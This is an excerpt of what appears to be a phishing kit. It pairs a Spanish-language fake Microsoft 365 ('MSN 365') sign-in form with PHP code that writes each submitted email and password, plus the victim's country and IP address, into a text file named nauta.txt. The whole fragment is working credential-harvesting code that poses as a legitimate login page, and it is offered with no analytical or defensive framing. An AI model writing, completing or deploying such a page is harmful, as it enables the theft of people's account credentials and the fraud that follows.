...
<div>
  <div class="contact-form-wrapper d-flex justify-content-center" id="mld">
    <form action="#" id="contenido1" method="post" class="contact-form">
      ...
      <p class="description">Iniciar Sesi&oacute;n Para Continuar.
      </p>
      <div id="numo">
      <div>
	  <input type="hidden" id="idmedu129" name="id" >
        <input type="email" class="form-control rounded border-white mb-3 form-input" id="name" name="nm1" placeholder="Correo Electronico MSN 365" required>
      </div>
      <div>
...
if (isset($_POST['nm1']) && isset($_POST['nm2']) ){
  session_start();
$_SESSION['mail']=$_POST['nm1'];
	 
 $file = fopen("nauta.txt", "a");
fwrite($file, "Correo: ".$_POST['nm1']." - Clave: ".$_POST['nm2']." - pais: ".$pais." - ip: ".$ip."" . PHP_EOL ."*************************************" . PHP_EOL);
fclose($file);
